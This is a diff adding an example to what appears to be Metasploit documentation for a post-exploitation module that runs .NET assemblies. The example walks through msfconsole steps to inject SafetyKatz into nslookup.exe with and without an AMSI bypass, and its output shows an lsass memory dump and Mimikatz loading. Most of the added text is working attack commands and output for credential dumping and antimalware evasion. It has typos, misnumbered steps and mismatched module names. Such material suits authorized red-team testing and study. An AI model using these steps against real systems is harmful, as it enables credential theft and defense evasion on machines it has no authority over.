@@ -97,6 +97,98 @@ msf5 post(windows/manage/execute_assembly) > run
 [*] Post module execution completed
 msf5 post(windows/manage/execute_assembly) >
 ```
+
+  Example 3 perform the functionality test of the Amsi bypass.
+  To perform the test it is necessary to use an assembly that runs 
+  Assembly.Load to load an assembly that we know to be detected. 
+  In the following example we use SafetyKatz which dynamically 
+  loads Mimikatz via Assmbly.Load
+  
+  1. Start Clone from github SafetyKatz or other .Net progect
+  2. Buid project with target framework 4.x
+  2. Start msfconsole
+  4. Do: ```use post/windows/manage/execute_assembly```
+  5. Do: ```set SESSION sessionid```
+  6. Do: ```set PID 8648```
+  7. Do: ```set ASSEMBLYPATH /your/output/forder```
+  8. Do: ```set ASSEMBLY SafetyKatz.exe```
+  9. Do: ```set ARGUMENTS user```
+  10. Do: ```set PROCESS nslookup.exe```
+  11. Do: ```set AMSIBYPASS false```
+  12. Do: ```run```
+  13. You should get something like that follow
+
+```
+msf5 post(windows/manage/execute_dotnet_assembly) > run
+
+[*] Launching nslookup.exe to host CLR...
+[+] Process 19904 launched.
+[*] Reflectively injecting the Host DLL into 19904..
+[*] Injecting Host into 19904...
+[*] Host injected. Copy assembly into 19904...
+[*] Assembly copied.
+[*] Executing...
+[*] Start reading output
+[+] Server predefinito:  
+[+] Address:  192.168.1.1
+[+] 
+[+] > 
+[*] End output.
+[+] Killing process 19904
+[+] Execution finished.
+[*] Post module execution completed
+msf5 post(windows/manage/execute_dotnet_assembly) >
+```
+
+Than
+
+  1. Do: ```set AMSIBYPASS true```
+  2. Do: ```run```
+  
+```
+msf5 post(windows/manage/execute_dotnet_assembly) > set amsibypass true
+amsibypass => true
+msf5 post(windows/manage/execute_dotnet_assembly) > run
+
+[*] Launching nslookup.exe to host CLR...
+[+] Process 19568 launched.
+[*] Reflectively injecting the Host DLL into 19568..
+[*] Injecting Host into 19568...
+[*] Host injected. Copy assembly into 19568...
+[*] Assembly copied.
+[*] Executing...
+[*] Start reading output
+[+] Server predefinito:  
+[+] Address:  192.168.1.1
+[+] 
+[+] > 
+[+] [*] Dumping lsass (744) to C:\WINDOWS\Temp\debug.bin
+[+] [+] Dump successful!
+[+] 
+[+] [*] Executing loaded Mimikatz PE
+[+] 
+[+]   .#####.   mimikatz 2.1.1 (x64) built on Jul  7 2018 03:36:26 - lil!
+[+]  .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+[+]  ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+[+]  ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+[+]  '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+[+]   '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/
+[+] 
+[+] mimikatz # Opening : 'C:\Windows\Temp\debug.bin' file for minidump...
+[+] ERROR kuhl_m_sekurlsa_acquireLSA ; Logon list
+[+] Opening : 'C:\Windows\Temp\debug.bin' file for minidump...
+[+] ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000002)
+[+] 
+[+] mimikatz # deleting C:\Windows\Temp\debug.bin
+[+] Execution started
+[+] ICorRuntimeHost->GetDefaultDomain(...) succeeded
+[*] End output.
+[+] Killing process 19568
+[+] Execution finished.
+[*] Post module execution completed
+msf5 post(windows/manage/execute_dotnet_assembly) >
+```
+
 ## Options
 
 ```
